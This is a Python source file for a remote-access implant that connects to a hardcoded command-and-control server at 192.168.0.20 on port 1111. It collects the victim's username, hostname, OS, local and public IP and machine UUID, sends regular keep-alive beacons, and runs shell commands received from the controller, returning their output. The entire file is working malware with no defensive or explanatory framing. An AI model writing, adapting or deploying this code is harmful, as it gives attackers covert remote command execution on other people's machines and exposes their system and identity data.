import sys
import socket
import subprocess
import os
import time
import getpass
import uuid
from threading import Thread
from time import gmtime, strftime

class Ping_server(Thread):
    # Thread that send alive message back to the server
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        if sys.version_info[0] == 3:
            from urllib.request import urlopen
        else:
            from urllib import urlopen

        UUID = uuid.UUID(int=uuid.getnode())
        Os = os.name
        Computer = socket.gethostname()
        Loacl_ip = socket.gethostbyname(socket.gethostname())
        Hostname = getpass.getuser()
        # Gather info about the client

        with urlopen("http://icanhazip.com/") as url:
            s = url.read()
            Public_ip = str(s)
            Public_ip = Public_ip.replace("b'", "")[:-3]

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))

        date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
        Chaine = "Init:" + date + "," + str(
            UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
        s.send(Chaine.encode())
        s.close()
        # Socket for keep-alive connexion

        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.0.20", 1111))

            time.sleep(10)
            date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
            Chaine = "Alive:" + date + "," + str(
                UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
            s.send(Chaine.encode())
            print("[DEBUG] I'm Alive and seems connected to the C2 server.")

class Receive_cmd(Thread):
    # Thread that receive remote command, execute them, and send back the result to the C2 server
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        s_re = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_re.bind(('', 1111))
        # Socket for receiving command from the C2 server
        #############
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20", 1111))
        Chaine = "test"
        s.send(Chaine.encode())

        while True:
            s_re.listen(5)
            client, address = s_re.accept()

            if str(address[0]) == "192.168.0.20":
                print("[+] Connected with the server")
            else:
                print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
                exit(0)
            # Check if the command are coming from the right C2 server

            response = client.recv(2048)
            if "shell" in str(response).replace("b'", "")[:-1]:
                print("[+] Server request a shell")

                cmd = str(response[6:]).replace("b'", "")[:-1]
                print("[+] Remote command is : " + cmd)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("192.168.0.20", 1111))
                # Socket for sending result of server query

                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                args = stdout_value

                s.send(str('CMD:').encode() + args)

                print("[+] result : " + str(args))
                s.close()
            else:
                print("[-] Server request something that i can't handle now. Update me !")


Ping_server_Thread = Ping_server()
Receive_cmd_Thread = Receive_cmd()

Ping_server_Thread.start()
Receive_cmd_Thread.start()
# Start thread